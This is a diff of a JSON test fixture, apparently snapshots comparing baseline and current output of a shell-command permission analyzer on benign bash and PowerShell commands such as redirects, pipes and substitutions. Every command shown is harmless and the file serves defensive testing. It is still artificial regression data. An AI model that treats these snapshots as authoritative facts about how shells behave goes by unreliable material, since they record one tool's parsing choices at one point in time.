+            "Out-File out.txt"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Out-File",
+                "args": [
+                  "out.txt"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [
+              "|"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "logical_expression:@'\nhere\n'@"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "@;here;@",
+              "args": [],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "Out-File",
+              "args": [
+                "out.txt"
+              ],
+              "segmentIndex": 1
+            }
+          ],
+          "connectors": [
+            "|"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Out-File",
+              "args": [
+                "out.txt"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [
+            "|"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "logical_expression:@'\nhere\n'@"
+          ]
+        }
+      },
+      "precheck": {
+        "baseline": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "complete",
+          "persistable": false,
+          "hasMetasyntax": true
+        },
+        "current": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
+        }
+      }
+    }
+  },
+  {
+    "id": "p08-subexpression",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output $($env.PATH)"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "$($env.PATH)"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output $($env.PATH)"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "$($env.PATH)"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "$($env.PATH)"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "$($env.PATH)"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "complete",
           "unresolved": []
@@ -1390,14 +742,14 @@
     }
   },
   {
-    "id": "b23-redirect-append-rel",
-    "dialect": "posix-bash",
+    "id": "p09-backtick-continuation",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo x >> out.txt"
+            "Get-ChildItem `\n  -Recurse"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -1414,13 +766,519 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "Get-ChildItem",
                 "args": [
-                  "x",
-                  ">>",
+                  "`"
+                ],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "-Recurse",
+                "args": [],
+                "segmentIndex": 1
+              }
+            ],
+            "connectors": [
+              ";"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Get-ChildItem `\n  -Recurse"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Get-ChildItem",
+                "args": [
+                  "-Recurse"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Get-ChildItem",
+              "args": [
+                "`"
+              ],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "-Recurse",
+              "args": [],
+              "segmentIndex": 1
+            }
+          ],
+          "connectors": [
+            ";"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Get-ChildItem",
+              "args": [
+                "-Recurse"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      }
+    }
+  },
+  {
+    "id": "p10-set-content",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Set-Content -Path ./out.txt -Value \"data\""
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Set-Content",
+                "args": [
+                  "-Path",
+                  "./out.txt",
+                  "-Value",
+                  "data"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [
+              "./out.txt"
+            ],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Set-Content -Path ./out.txt -Value \"data\""
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Set-Content",
+                "args": [
+                  "-Path",
+                  "./out.txt",
+                  "-Value",
+                  "\"data\""
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [
+              "./out.txt"
+            ],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Set-Content",
+              "args": [
+                "-Path",
+                "./out.txt",
+                "-Value",
+                "data"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [
+            "./out.txt"
+          ],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Set-Content",
+              "args": [
+                "-Path",
+                "./out.txt",
+                "-Value",
+                "\"data\""
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [
+            "./out.txt"
+          ],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      }
+    }
+  },
+  {
+    "id": "t1-04-dquote-unicode",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output \"unicode “text” inside\""
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "unicode “text” inside"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output \"unicode “text” inside\""
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "\"unicode “text” inside\""
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "unicode “text” inside"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "\"unicode “text” inside\""
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      }
+    }
+  },
+  {
+    "id": "t1-05-squote",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output 'single'"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "single"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output 'single'"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "'single'"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "single"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "'single'"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      }
+    }
+  },
+  {
+    "id": "t1-09-redirect",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Get-Content log.txt > out.txt"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Get-Content",
+                "args": [
+                  "log.txt",
+                  ">",
                   "out.txt"
                 ],
                 "segmentIndex": 0
@@ -1438,7 +1296,7 @@
         "current": {
           "verdict": "ask",
           "segments": [
-            "echo x >> out.txt"
+            "Get-Content log.txt > out.txt"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -1455,12 +1313,12 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "Get-Content",
                 "args": [
-                  "x"
+                  "log.txt"
                 ],
                 "segmentIndex": 0
               }
@@ -1475,13 +1333,13 @@
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "Get-Content",
               "args": [
-                "x",
-                ">>",
+                "log.txt",
+                ">",
                 "out.txt"
               ],
               "segmentIndex": 0
@@ -1496,12 +1354,12 @@
           ]
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "Get-Content",
               "args": [
-                "x"
+                "log.txt"
               ],
               "segmentIndex": 0
             }
@@ -1532,14 +1390,15 @@
     }
   },
   {
-    "id": "b24-redirect-input",
-    "dialect": "posix-bash",
+    "id": "t1-10-foreach-pipe",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "cat < input.txt"
+            "Get-ChildItem",
+            "ForEach-Object { $_.FullName }"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -1556,465 +1415,26 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "cat",
-                "args": [
-                  "<",
-                  "input.txt"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "partial",
-            "unresolved": [
-              "segment:0:shell-control-flow"
-            ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "cat < input.txt"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "cat",
+                "verb": "Get-ChildItem",
                 "args": [],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "cat",
-              "args": [
-                "<",
-                "input.txt"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:shell-control-flow"
-          ]
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "cat",
-              "args": [],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": false,
-          "hasMetasyntax": true
-        }
-      }
-    }
-  },
-  {
-    "id": "b25-redirect-stderr",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "make build 2>/dev/null"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "make",
-                "args": [
-                  "build",
-                  "2>/dev/null"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [
-              "2>/dev/null"
-            ],
-            "cwdChanges": [],
-            "analysisCompleteness": "partial",
-            "unresolved": [
-              "segment:0:shell-control-flow"
-            ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "make build 2>/dev/null"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [
-              {
-                "code": "PATH_OUTSIDE_<WORKDIR>",
-                "message": "命令包含工作目录外的路径：/dev/null",
-                "path": "/dev/null",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "命令包含工作目录外的路径：/dev/null"
-            ],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": true
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": false,
-            "warnings": [
-              "命令包含工作目录外的路径：/dev/null"
-            ],
-            "scannedPaths": [
-              "/dev/null"
-            ],
-            "violationCodes": [
-              "PATH_OUTSIDE_<WORKDIR>"
-            ]
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "make",
-                "args": [
-                  "build"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [
-              "/dev/null"
-            ],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "make",
-              "args": [
-                "build",
-                "2>/dev/null"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [
-            "2>/dev/null"
-          ],
-          "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:shell-control-flow"
-          ]
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "make",
-              "args": [
-                "build"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [
-            "/dev/null"
-          ],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": false,
-          "hasMetasyntax": true
-        }
-      }
-    }
-  },
-  {
-    "id": "b26-cmd-subst",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo $(pwd)"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "$(pwd)"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "partial",
-            "unresolved": [
-              "segment:0:shell-control-flow"
-            ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo $(pwd)"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "$(pwd)"
-                ],
                 "segmentIndex": 0
               },
               {
-                "verb": "pwd",
-                "args": [],
+                "verb": "ForEach-Object",
+                "args": [
+                  "{",
+                  "$_.FullName",
+                  "}"
+                ],
                 "segmentIndex": 1
               }
             ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "$(pwd)"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:shell-control-flow"
-          ]
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "$(pwd)"
-              ],
-              "segmentIndex": 0
-            },
-            {
-              "verb": "pwd",
-              "args": [],
-              "segmentIndex": 1
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": false,
-          "hasMetasyntax": true
-        }
-      }
-    }
-  },
-  {
-    "id": "b27-backtick-subst",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo `pwd`"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "`pwd`"
-                ],
-                "segmentIndex": 0
-              }
+            "connectors": [
+              "|"
             ],
-            "connectors": [],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "complete",
@@ -2024,7 +1444,8 @@
         "current": {
           "verdict": "ask",
           "segments": [
-            "echo `pwd`"
+            "Get-ChildItem",
+            "ForEach-Object { $_.FullName }"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2041,22 +1462,24 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
-                "args": [
-                  "`pwd`"
-                ],
+                "verb": "Get-ChildItem",
+                "args": [],
                 "segmentIndex": 0
               },
               {
-                "verb": "pwd",
-                "args": [],
+                "verb": "ForEach-Object",
+                "args": [
+                  "{ $_.FullName }"
+                ],
                 "segmentIndex": 1
               }
             ],
-            "connectors": [],
+            "connectors": [
+              "|"
+            ],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "complete",
@@ -2066,39 +1489,50 @@
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
-              "args": [
-                "`pwd`"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "`pwd`"
-              ],
+              "verb": "Get-ChildItem",
+              "args": [],
               "segmentIndex": 0
             },
             {
-              "verb": "pwd",
-              "args": [],
+              "verb": "ForEach-Object",
+              "args": [
+                "{",
+                "$_.FullName",
+                "}"
+              ],
               "segmentIndex": 1
             }
           ],
-          "connectors": [],
+          "connectors": [
+            "|"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Get-ChildItem",
+              "args": [],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "ForEach-Object",
+              "args": [
+                "{ $_.FullName }"
+              ],
+              "segmentIndex": 1
+            }
+          ],
+          "connectors": [
+            "|"
+          ],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "complete",
@@ -2108,14 +1542,14 @@
     }
   },
   {
-    "id": "b28-process-subst",
-    "dialect": "posix-bash",
+    "id": "t1-12-variable-assign",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "diff <(sort a.txt) <(sort b.txt)"
+            "$name = \"value\""
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -2132,55 +1566,13 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "diff",
+                "verb": "$name",
                 "args": [
-                  "<(sort",
-                  "a.txt)",
-                  "<(sort",
-                  "b.txt)"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "partial",
-            "unresolved": [
-              "segment:0:shell-control-flow"
-            ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "diff <(sort a.txt) <(sort b.txt)"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "diff",
-                "args": [
-                  "<(sort a.txt)",
-                  "<(sort b.txt)"
+                  "=",
+                  "value"
                 ],
                 "segmentIndex": 0
               }
@@ -2191,77 +1583,11 @@
             "analysisCompleteness": "complete",
             "unresolved": []
           }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "diff",
-              "args": [
-                "<(sort",
-                "a.txt)",
-                "<(sort",
-                "b.txt)"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:shell-control-flow"
-          ]
         },
         "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
